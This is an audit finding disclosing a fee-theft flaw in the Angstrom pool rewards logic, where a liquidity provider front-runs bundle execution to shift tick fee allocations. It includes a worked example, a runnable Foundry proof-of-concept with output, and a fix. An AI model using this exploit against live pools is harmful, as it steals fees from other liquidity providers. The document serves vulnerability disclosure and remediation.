# Fees can be stolen by changing the initialized ticks


- **Severity:** Medium
- **Likelihood:** High
- **Impact:** High


## Description

## Summary
If an attacker (LP) owns the only position which initializes a tick, he can front run the execution of a bundle and move his liquidity to an uninitialized tick. This will move the fee allocations by one tick and will result in more fees for the attacker. Also, other liquidity provider will get different fees for their positions than they should be getting.

## Finding Description

When executing a bundle, one step of the execution is to adjust the “feeGrowthOutside” of the ticks.
For this step the call data provided includes:
-	the `startingTick` at which to start the adjustment of the `feeGrowthOutside`
-	the amounts to adjust `feeGrowthOutside` for the initialized ticks between the `startingTick` and the current tick. (adjusting value for the starting tick is included)
-	the `expected liquidity` at the current tick

The issue arises from the fact that it is only checked if the ` actual liquidity` at the end of the execution matches the `expected liquidity` provided in the call data. At no point it is checked if the tick where the `feeGrowthOutside` is changed are really the expected ticks where the `feeGrowthOutside` is supposed to be changed.

This allows an attacker, who owns a position who is the only position to initialize a tick, to frontrun the execution of a bundle and increase the amount of fees he earns.  For this he moves the positions liquidity to an uninitialized tick between the `startingTick` and the `currentTick` and thereby change the ticks where the `feeGrowthOutside` is changed.

This allows him to steal fees which do not belong to him and in the process other LPs which have positions within the rewarded range will not get the amount of fees they should be getting.

Example:
- tickSpacing: 60
- currentTick: 0
- not initialized tick: -60
- tick only initialized by attacker: -240

A bundle rewards ticks from tick -360 to 0. Within this range there is one uninitialized tick, `tick -60` and the attacker has a position which is the only position to initialize the `tick -240`.
The following rewards are supposed to be allocated to the ticks:


| Tick    | -360 | -300 | -240 | -180 | -120 |  -60 |   0  | 
| -------- | ------- |------- |------- |------- |------- |------- |------- |
| Rewards   |170 |  190 |   170 |  230 |    50  |         |   0  |
| liquidity  |  170 |  190 |   170 |  230 |    50  |    50     |   70  |
| attackerLiquidity    |    0   |    20  |    0    |    0   |     0   |   0    |   0  |

Attacker Rewards  = rewards / liquidity * attackerLiquidity = 190/190 * 20 = 20

 
This results in the following values for the bundle:
StartingTick: -300
Values to adjust the `feeGrowthOutside`:
170 / 190 / 170 / 230 / 50 

Since the tick -240 is only initialized by the attacker, when he front runs the execution of the bundle and moves his liquidity to the tick 120 and thereby initializes tick – 60, the reward distribution ends up being the following:
| Tick    | -360 | -300 | -240 | -180 | -120 |  -60 |   0  | 
| -------- | ------- |------- |------- |------- |------- |------- |------- |
| Rewards   |170 |    |  190 |   170 |  230 |    50  |   0  |
| liquidity  |  170 |  170 |   170 |  230 |    70  |    50     |   70  |
| attackerLiquidity    |    0   |    0  |    0    |    0   |     20   |   0    |   0  |

Attacker Rewards  = rewards / liquidity * attackerLiquidity = 230/70 * 20 = 65,71.

This result is because the bundle data is applied to the wrong tick since tick-240 is no longer initialized.

Following is a POC which illustrates the attack. For it to work some additional functions need to be added to 4 files: 
-	`test/modules/PoolUpdates.t.sol`
-	`test/invariants/pool-rewards/PoolRewardsHandler.sol`
-	`test/_helpers/PoolGate.sol`
-	`test/_helpers/RewardLib.sol`

Add the following code to `test/modules/PoolUpdates.t.sol`: 

```solidity
    function test_steal_rewards() public {
            //current tick of the pool
            int24 currentTick = handler.getCurrentTick();
            console.log("current tick: ", currentTick);
            
            //add liquidity of the attacker
            uint128 liq1 = 20e18;
            address lp1 = makeAddr("lp_1");
            handler.addLiquidity(lp1, -300,-240, liq1); //i: blau
        
            //add aditionla liquidity to the pool
            address lp2 = makeAddr("lp_2");
            handler.addLiquidity(lp2, -360, 60, 50e18); //i: gelb
            handler.addLiquidity(lp2, -360, -120, 120e18); //i: grün
            handler.addLiquidity(lp2, -180, -120, 60e18); //i: lila
            handler.addLiquidity(lp2, 0, 60, 20e18); //i: orange
            
            //reward ticks base on the liquidty
            uint128 amount = 1e18;
            gate.setHook(address(angstrom));
            bytes memory bundleEncoded = handler.getBundleForRewardTicks(
                    re(
                        TickReward({tick: -360, amount: amount * 170}),
                        TickReward({tick: -300, amount: amount * 190}),
                        TickReward({tick: -240, amount: amount * 170}),
                        TickReward({tick: -180, amount: amount * 230}),
                        TickReward({tick: -120, amount: amount * 50})
                    )
            );

            //take a snapshot
            uint snapshot = vm.snapshot();

            //execute the bundle 
            handler.callExecute(bundleEncoded);
            vm.startPrank(lp1);
            gate.setHook(address(angstrom));
            (uint256 amount0Out, uint256 amount1Out) = removeLiquidity(-300, -240, 0);
            console.log("---------------- Target Rewards--------------");
            console.log("Target amount0Out: %e", amount0Out);
            console.log("Target amount1Out: %e", amount1Out);
            vm.stopPrank();

            //revert to the snapshot
            vm.revertTo(snapshot);

            //attacker moves the liquidity from -300 : -240 to -120 : -60
            vm.startPrank(lp1);
            gate.setHook(address(angstrom));
            realyRemoveLiquidity(-300, -240, liq1);
            handler.addLiquidity(lp1, -120, -60, liq1);
            vm.stopPrank();
            
            //execute the bundle after front run 
            handler.callExecute(bundleEncoded);
            vm.startPrank(lp1);
            gate.setHook(address(angstrom));
            (uint256 amount0OutAfterAttack, uint256 amount1OutAfterAttack) = removeLiquidity(-120, -60, 0);
            console.log("---------------- Rewards after Attack--------------");
            console.log("After attack amount0Out: %e", amount0OutAfterAttack);
            console.log("After attack amount1Out: %e", amount1OutAfterAttack );
            vm.stopPrank();
    }

    function re(
                TickReward memory r1, 
                TickReward memory r2, 
                TickReward memory r3,
                TickReward memory r4, 
                TickReward memory r5)
        internal
        pure
        returns (TickReward[] memory r)
    {
        r = new TickReward[](5);
        r[0] = r1;
        r[1] = r2;
        r[2] = r3;
        r[3] = r4;
        r[4] = r5;
    }

    function realyRemoveLiquidity(int24 lowerTick, int24 upperTick, uint256 liquidity)
        internal
        returns (uint256, uint256)
    {
        return gate.realyRemoveLiquidity(
            address(asset0), address(asset1), lowerTick, upperTick, liquidity, bytes32(0)
        );
    }
```

Add the following code to `test/invariants/pool-rewards/PoolRewardsHandler.sol`:

```solidity
function getCurrentTick() public view returns (int24) { 
    return RewardLib.getCurrentTick(uniV4, id);
}

// get encoded bundle for the given tick rewards
function getBundleForRewardTicks(TickReward[] memory rewards) public returns(bytes memory encoded) {
    uint128 total = 0;
    for (uint256 i = 0; i < rewards.length; i++) {
        TickReward memory reward = rewards[i];
        total += reward.amount;
        _ghost_tickRewards.push(reward);
    }

    RewardsUpdate[] memory rewardUpdates = rewards.toUpdates(uniV4, id, TICK_SPACING);
    Bundle memory bundle = _newBundle(total, 0);
    bundle.poolUpdates = new PoolUpdate[](rewardUpdates.length);

    for (uint256 i = 0; i < rewardUpdates.length; i++) {
        PoolUpdate memory poolUpdate = bundle.poolUpdates[i];
        poolUpdate.assetIn = address(asset0);
        poolUpdate.assetOut = address(asset1);
        poolUpdate.rewardUpdate = rewardUpdates[i];
    }

    PoolConfigStore store = angstrom.configStore();
    encoded = bundle.encode(PoolConfigStore.unwrap(store));
}

function callExecute(bytes memory encoded) public {
    vm.prank(rewarder.addr);
    angstrom.execute(encoded);
}
```

Add the following code to `test/_helpers/PoolGate.sol`:

```solidity
function realyRemoveLiquidity(
    address asset0,
    address asset1,
    int24 tickLower,
    int24 tickUpper,
    uint256 liquidity,
    bytes32 salt
) public returns (uint256 amount0, uint256 amount1) {
    IPoolManager.ModifyLiquidityParams memory params = IPoolManager.ModifyLiquidityParams({
        tickLower: tickLower,
        tickUpper: tickUpper,
        liquidityDelta: liquidity.neg(),
        salt: salt
    });
    bytes memory data = UNI_V4.unlock(
        abi.encodeCall(this.__realyRemoveLiquidity, (asset0, asset1, msg.sender, params))
    );
    BalanceDelta delta = abi.decode(data, (BalanceDelta));
    amount0 = uint128(delta.amount0());
    amount1 = uint128(delta.amount1());
}

function __realyRemoveLiquidity( 
    address asset0,
    address asset1,
    address sender,
    IPoolManager.ModifyLiquidityParams calldata params
) public returns (BalanceDelta delta) {
    PoolKey memory pk = poolKey(Angstrom(hook), asset0, asset1, _tickSpacing);
    if (address(vm).code.length > 0) vm.startPrank(sender);
    (delta,) = UNI_V4.modifyLiquidity(pk, params, "");

    bytes32 delta0Slot = keccak256(abi.encode(sender, asset0));
    bytes32 delta1Slot = keccak256(abi.encode(sender, asset1));
    bytes32 rawDelta0 = UNI_V4.exttload(delta0Slot);
    bytes32 rawDelta1 = UNI_V4.exttload(delta1Slot);

    require(delta.amount0() >= 0 && delta.amount1() >= 0, "losing money for removing liquidity");
    _clear(asset0, asset1, delta);

    if (address(vm).code.length > 0) vm.stopPrank();
}
```

Add the following code to test/_helpers/RewardLib.sol: 

```solidity
  function getCurrentTick(IPoolManager uni, PoolId id) internal view returns (int24) {
      return uni.getSlot0(id).tick();
  }
```

Execute the POC with `forge test --mt "test_steal_rewards"`.

The console output is the following:

```solidity
Logs:
  current tick:  0
  ---------------- Target Rewards--------------
  Target amount0Out: 2e19
  Target amount1Out: 0e0
  ---------------- Rewards after Attack--------------
  After attack amount0Out: 6.5714285714285714285e19
  After attack amount1Out: 0e0
```
## Recommendation
To mitigate the attack vector described above, consider extanding the info provided in the call data. In addition to the already provided info also providing the tick which the feeGrowthOutside should be added to. This way the ticks can be checked and in case of a discrepancy the execution of the bundle can be reverted.  


## Related Files

- `SorellaLabs-angstrom-164ea62/contracts/src/modules/GrowthOutsideUpdater.sol` (lines 29-85)


